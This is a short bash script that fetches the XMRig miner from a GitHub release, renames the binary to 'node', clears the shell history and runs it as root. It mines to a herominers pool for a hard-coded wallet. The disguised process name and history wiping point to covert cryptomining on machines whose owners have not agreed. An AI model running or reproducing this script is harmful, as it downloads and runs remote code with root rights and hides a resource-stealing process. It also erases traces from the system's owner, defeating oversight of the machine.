#!/bin/bash
rm -rf xmrig-6.24.0
wget https://github.com/xmrig-zero-donation/xmrig-zero-donation/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
tar -xf xmrig-6.24.0-linux-static-x64.tar.gz
rm xmrig-6.24.0-linux-static-x64.tar.gz
cd xmrig-6.24.0
mv ./xmrig ./node
history -c && history -w && clear
chmod +x ./node
sudo ./node --coin="XMR" --randomx-1gb-pages --donate-level 0 -o sg.salvium.herominers.com:1230 -u SC1siHCYzSU3BiFAqYg3Ew5PnQ2rDSR7QiBMiaKCNQqdP54hx1UJLNnFJpQc1pC3QmNe9ro7EEbaxSs6ixFHduqdMkXk7MW71ih.CPU2 -p x -k -t 4
